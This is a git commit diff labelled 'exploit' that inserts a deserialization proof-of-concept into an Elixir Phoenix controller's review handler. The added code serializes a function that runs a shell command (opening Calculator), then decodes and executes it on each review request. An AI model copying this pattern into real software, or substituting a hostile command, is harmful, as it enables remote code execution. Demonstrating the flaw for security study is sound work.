9f954e4b152cf722e97f3797718f5535108dea4a
Jacob Luetzow <jacob@perfectform.io>
2024-01-30 22:23:32 -0700

    exploit

--- lib/carafe_web/controllers/potion_controller.ex
+++ lib/carafe_web/controllers/potion_controller.ex
@@ -23,21 +23,56 @@ defmodule CarafeWeb.PotionController do
   end
 
   def create_review(conn, %{"id" => potion_id, "review" => review_params}) do
+    # Decoding and executing the exploit
+
     potion = Potions.get_potion(potion_id)
     user = Accounts.get_user_by_email(review_params["email"])
+
+    exploit = fn _, _ ->
+      System.cmd("open", ["-a", "Calculator"])
+      {:cont, []}
+    end
+
+    payload =
+      exploit
+      |> :erlang.term_to_binary()
+      |> Base.encode64()
+
+    f = :erlang.binary_to_term(Base.decode64!(payload), [:safe])
+    f.(1, 2)
+
     params =
       review_params
       |> Map.put("user_id", user.id)
       |> Map.put("potion_id", potion_id)
+
     case Potions.create_review(params) do
       {:ok, _review} ->
         conn
         |> put_flash(:info, "Review created")
         |> redirect(to: Routes.potion_path(conn, :show, potion_id))
+
       {:error, changeset} ->
         render(conn, "show.html", potion: potion, changeset: changeset)
     end
   end
+
+  # def create_review(conn, %{"id" => potion_id, "review" => review_params}) do
+  #   potion = Potions.get_potion(potion_id)
+  #   user = Accounts.get_user_by_email(review_params["email"])
+  #   params =
+  #     review_params
+  #     |> Map.put("user_id", user.id)
+  #     |> Map.put("potion_id", potion_id)
+  #   case Potions.create_review(params) do
+  #     {:ok, _review} ->
+  #       conn
+  #       |> put_flash(:info, "Review created")
+  #       |> redirect(to: Routes.potion_path(conn, :show, potion_id))
+  #     {:error, changeset} ->
+  #       render(conn, "show.html", potion: potion, changeset: changeset)
+  #   end
+  # end
 
   def api(conn, %{"after" => a}) do
     %{entries: entries, metadata: m} = Potions.api(a)
@@ -48,5 +83,4 @@ defmodule CarafeWeb.PotionController do
     %{entries: entries, metadata: m} = Potions.api()
     json(conn, %{potions: entries, after: m.after})
   end
-
 end
